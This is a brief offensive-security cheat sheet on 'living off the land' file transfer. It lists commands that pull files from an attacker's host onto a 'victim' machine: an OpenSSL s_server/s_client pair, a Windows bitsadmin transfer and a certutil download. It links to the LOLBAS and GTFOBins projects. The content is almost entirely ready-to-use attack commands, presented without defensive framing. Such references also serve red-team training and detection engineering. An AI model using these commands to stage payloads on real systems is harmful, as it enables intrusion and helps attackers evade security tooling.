# **LOLBINS FILE TRASNFER**

## Linux Download with OpenSSL

> ### Create Certificate
>
>     openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem

> ### Create Server
>
>     openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < <SOURCE_FILE>

> ### Download on Victim
>
>     openssl s_client -connect <IP>:80 -quiet > <DESTINATION_FILE>

## Windows Download with Bitsadmin

    bitsadmin /transfer wcb /priority foreground <URI> <DESTINATION_FILE>

## Windows Download with certutil.exe

    certutil.exe -verifyctl -split -f <URI>

## Resources

- https://lolbas-project.github.io/#
- https://gtfobins.org/